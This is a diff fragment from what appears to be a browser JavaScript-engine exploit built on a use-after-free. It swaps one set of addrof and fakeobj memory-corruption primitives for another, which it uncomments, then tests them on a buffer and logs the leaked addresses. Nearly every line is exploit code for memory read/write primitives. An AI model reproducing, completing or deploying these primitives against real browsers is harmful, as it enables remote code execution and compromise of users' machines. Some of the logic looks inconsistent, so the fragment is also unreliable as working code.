@@ -274,22 +274,11 @@ for (let i = 0; i < UAF_SIZE; i += 8) {
   log(`[FAKE @0x${i.toString(16)}] = 0x${val.toString(16)}`);
 }
 
-const fakeBuf = new Uint8Array(UAF_SIZE);
-const bvFake = new BufferView(fakeBuf.buffer);
-const fakeArr = new Array(1);
- const bv = new BufferView(buf.buffer);
-
- function fakeobj(addr) {
-  bvFake.writeU64(off.js_butterfly, addr);
-  return fakeArr;
-}
- function addrof(obj) {
-  bv.writeU64(off.js_butterfly - 0x10, Memory.toValues(obj));
-  return bv.readU64(off.js_butterfly - 0x10);
-}
 
  
-/*  const bv = new BufferView(buf.buffer);
+
+ 
+   const bv = new BufferView(buf.buffer);
   const fakeArr = bv.readU64(off.js_butterfly);
 
   function addrof(obj) {
@@ -300,7 +289,7 @@ const fakeArr = new Array(1);
     bv.writeU64(off.js_butterfly, addr);
     return fakeArr;
   }
-*/
+ 
   const testAddr = addrof(buf);
   log('[+] addrof(buf)=', hex(testAddr));
   const view = fakeobj(testAddr + BigInt(0x100));
